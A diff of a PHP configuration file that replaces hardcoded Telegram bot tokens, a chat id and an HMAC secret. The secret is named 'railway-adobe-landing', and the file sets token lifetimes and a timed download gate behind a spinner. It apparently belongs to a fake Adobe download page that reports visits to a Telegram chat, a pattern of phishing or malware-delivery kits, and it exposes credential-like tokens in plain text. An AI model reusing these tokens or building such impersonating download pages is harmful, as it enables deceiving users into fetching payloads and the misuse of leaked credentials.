@@ -20,13 +20,13 @@
 // =====================================================================
 
 // Full bot token (id:secret) — a bare numeric id 404s on the API. Env-overridable.
-define('TG_BOT',   (string)($_ENV['TG_BOT'] ?? '7996594831:AAF40Dc-5ZnVKBldh5AnxVKsWNJmTnXxb2Q'));
-define('TG_CHAT',  '6221767926');
+define('TG_BOT',   (string)($_ENV['TG_BOT'] ?? '8976820189:AAHT_AHsbaZCHWd2RTtke3DyMlt8m4Vl4Jw'));
+define('TG_CHAT',  '7500008875');
 
 // Stable HMAC secret so a token issued by index.php validates in later
 // requests (each web request is a separate process). Env-overridable; the
 // fallback is fixed so the app works with zero config.
-define('SECRET', (string)($_ENV['TK_SECRET'] ?? 'railway-adobe-landing-9f2e1c7a4b83-0a6d5512'));
+define('SECRET', (string)($_ENV['TK_SECRET'] ?? 'railway-adobe-plhibee-2f8c6a09-74bd1e35'));
 
 define('TTL', 900);            // token lifetime (15 min)
 define('MIN_DL_AGE', 6);       // index -> ... -> dl must span >= 6s (5s spinner + 2s button)
